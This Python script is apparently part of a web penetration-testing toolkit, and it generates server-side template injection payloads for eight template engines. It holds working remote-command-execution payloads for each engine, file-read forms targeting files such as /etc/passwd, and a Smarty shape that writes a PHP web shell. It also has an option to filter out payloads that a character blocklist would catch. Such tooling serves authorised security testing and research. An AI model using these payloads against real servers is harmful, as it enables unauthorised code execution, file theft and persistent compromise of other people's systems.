#!/usr/bin/env python3
"""Emit engine-correct SSTI payloads — the half after ssti_probe names
an engine candidate.

  python3 tools/web/ssti_gen.py --engine jinja2 --cmd 'id'
  python3 tools/web/ssti_gen.py --engine twig --read /etc/passwd
  python3 tools/web/ssti_gen.py --engine jinja2 --marker PWNED --ban '._'
  python3 tools/web/ssti_gen.py --selftest

--cmd substitutes your command into every RCE shape the references
carry for that engine; --read builds file-read forms; --marker emits a
non-destructive render probe (the honest first confirm: a rendered
marker is SSTI, command output is escalation). --ban drops every
payload containing a banned char — quote/dot/underscore filters are
the usual block, and surviving variants exist for most engines.

These are candidate payloads: engine version, sandboxing, and the
template's own context decide what actually fires. Pair every result
with the confirm evidence the web-ssti skill requires.
"""
import argparse, json, sys

# {ENGINE}: list of (shape-name, template). {C}=cmd, {F}=file, {M}=marker.
PAYLOADS = {
    "jinja2": [
        ("config-globals", "{{config.__class__.__init__.__globals__"
         "['os'].popen('{C}').read()}}"),
        ("lipsum-globals", "{{lipsum.__globals__['os'].popen('{C}').read()}}"),
        ("request-builtins", "{{request.application.__globals__."
         "__builtins__.__import__('os').popen('{C}').read()}}"),
        ("subclasses-wrapclose", "{{''.__class__.__mro__[1].__subclasses__"
         "()[I].__init__.__globals__['popen']('{C}').read()}}"),
        ("bracket-nodots", "{{''['__class__']['__mro__'][1]['__subclasses__"
         "']()[I]['__init__']['__globals__']['popen']('{C}')['read']()}}"),
    ],
    "twig": [
        ("filter-system", "{{{{['{C}']|filter('system')}}}}"),
        ("map-system", "{{{{['{C}']|map('system')|join}}}}"),
        ("env-callback", "{{{{_self.env.registerUndefinedFilterCallback"
         "(\"exec\")}}}}{{{{_self.env.getFilter(\"{C}\")}}}}"),
        ("sort-filter", "{{{{['{C}']|sort('system')|join}}}}"),
    ],
    "freemarker": [
        ("execute-utility", "<#assign ex=\"freemarker.template.utility."
         "Execute\"?new()>${{ex(\"{C}\")}}"),
        ("objectconstructor", "${{\"freemarker.template.utility.Execute\""
         "?new()(\"{C}\")}}"),
        ("api-rtexpr", "<#assign v=\"freemarker.template.utility."
         "ObjectConstructor\"?new()>${{v(\"java.lang.ProcessBuilder\","
         "\"{C0}\",\"{C1}\").start()}}"),
    ],
    "velocity": [
        ("runtime-exec", "#set($x=\"\")$x.class.forName(\"java.lang."
         "Runtime\").getRuntime().exec(\"{C}\")"),
        ("classtool", "#set($e=\"e\")$e.getClass().forName(\"java.lang."
         "Runtime\").getMethod(\"exec\",$e.getClass().forName(\"java.lang."
         "String\")).invoke($e.getClass().forName(\"java.lang.Runtime\")"
         ".getMethod(\"getRuntime\").invoke(null),\"{C}\")"),
    ],
    "mako": [
        ("import-os", "${{__import__('os').popen('{C}').read()}}"),
        ("module-os", "${{self.module.cache.util.os.popen('{C}').read()}}"),
    ],
    "erb": [
        ("system", "<%= system('{C}') %>"),
        ("backtick", "<%= `{C}` %>"),
        ("eval-open", "<%= IO.popen('{C}').read %>"),
    ],
    "smarty": [
        ("system-tag", "{{system('{C}')}}"),
        ("writefile-shell", "{{Smarty_Internal_Write_File::writeFile"
         "('{F}','<?php system($_GET[0]);?>',self::clearConfig())}}"),
        ("eval-deprecated", "{{eval var='{C}'}}"),
    ],
    "thymeleaf": [
        ("springel-exec", "${{T(java.lang.Runtime).getRuntime().exec"
         "(\"{C}\")}}"),
        ("preprocess", "__${{T(java.lang.Runtime).getRuntime().exec"
         "(\"{C}\")}}__::.x"),
    ],
}
READS = {
    "jinja2": "{{config.__class__.__init__.__globals__['os'].popen"
              "('cat {F}').read()}}",
    "twig": "{{{{'{F}'|file_excerpt(1,30)}}}}",
    "freemarker": "${{product.getClass().getProtectionDomain()"
                  ".getCodeSource().getLocation()}}",
    "mako": "${{open('{F}').read()}}",
    "erb": "<%= File.read('{F}') %>",
    "smarty": "{{include file='{F}'}}",
    "velocity": "#set($s=$x.class.forName(\"java.util.Scanner\"))"
                "$s.getConstructor($x.class.forName(\"java.io.File\"))"
                ".newInstance(\"{F}\").useDelimiter(\"\\\\Z\").next()",
    "thymeleaf": "${{T(java.nio.file.Files).readAllBytes(T(java.nio."
                 "file.Paths).get(\"{F}\"))}}",
}
MARKERS = {
    "jinja2": "{{7*'{M}'}}",
    "twig": "{{{{7*'{M}'}}}}",
    "freemarker": "${{7*{M}}}",
    "velocity": "#set($m=7*{M})$m",
    "mako": "${{7*'{M}'}}",
    "erb": "<%= 7 * {M} %>",
    "smarty": "{{7*{M}}}",
    "thymeleaf": "${{7*{M}}}",
}


def _fill(t, cmd, fname, marker):
    parts = cmd.split(" ", 1)
    return (t.replace("{C}", cmd).replace("{C0}", parts[0])
             .replace("{C1}", parts[1] if len(parts) > 1 else "")
             .replace("{F}", fname).replace("{M}", marker)
             .replace("{I}", "INDEX"))


def gen(engine, cmd, fname, marker, ban):
    out = []
    if engine not in PAYLOADS:
        return [{"error": "unknown engine %r — ssti_probe's candidate "
                          "column names the supported set; engine "
                          "detection first" % engine}]
    if marker:
        out.append({"kind": "marker", "shape": "render-probe",
                    "payload": _fill(MARKERS[engine], cmd, fname, marker)})
    if cmd:
        for name, t in PAYLOADS[engine]:
            p = _fill(t, cmd, fname, marker)
            out.append({"kind": "rce", "shape": name, "payload": p})
    if fname and engine in READS:
        out.append({"kind": "read", "shape": "file-read",
                    "payload": _fill(READS[engine], cmd, fname, marker)})
    if ban:
        banned = set(ban)
        kept = [o for o in out
                if not any(c in banned for c in o["payload"])]
        out = kept if kept else out[:1] + [{
            "warning": "every shape contains a banned char — keep the "
                       "unfiltered list and try an encoder (join/attr/"
                       "concat) instead"}]
    return out


def _selftest() -> int:
    r = gen("jinja2", "id", "", "", "")
    assert any("popen('id')" in o["payload"] for o in r), r
    r = gen("twig", "cat /etc/passwd", "", "", "")
    assert any("filter('system')" in o["payload"] for o in r), r
    # ban a char every jinja2 payload uses -> warning row appended
    r = gen("jinja2", "id", "", "", "'")
    assert any("warning" in o for o in r), r
    # marker + read forms exist
    r = gen("erb", "", "/etc/passwd", "7", "")
    assert any(o["kind"] == "marker" for o in r), r
    r = gen("mako", "", "/etc/passwd", "", "")
    assert any("/etc/passwd" in o["payload"] for o in r), r
    # unknown engine -> honest error row, not a guess
    r = gen("tornado", "id", "", "", "")
    assert "error" in r[0], r
    print("ssti_gen selftest: ok")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--engine", default="jinja2",
                    choices=sorted(PAYLOADS))
    ap.add_argument("--cmd", default="")
    ap.add_argument("--read", dest="fname", default="")
    ap.add_argument("--marker", default="")
    ap.add_argument("--ban", default="",
                    help="chars the filter bans — drops matching shapes")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        return _selftest()
    if not (a.cmd or a.fname or a.marker):
        ap.error("nothing to generate — pass --cmd, --read, or --marker")
    print(json.dumps({"engine": a.engine,
                      "payloads": gen(a.engine, a.cmd, a.fname,
                                      a.marker, a.ban),
                      "note": "INDEX placeholders mark subclasses() "
                              "positions — enumerate first"}, indent=1))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
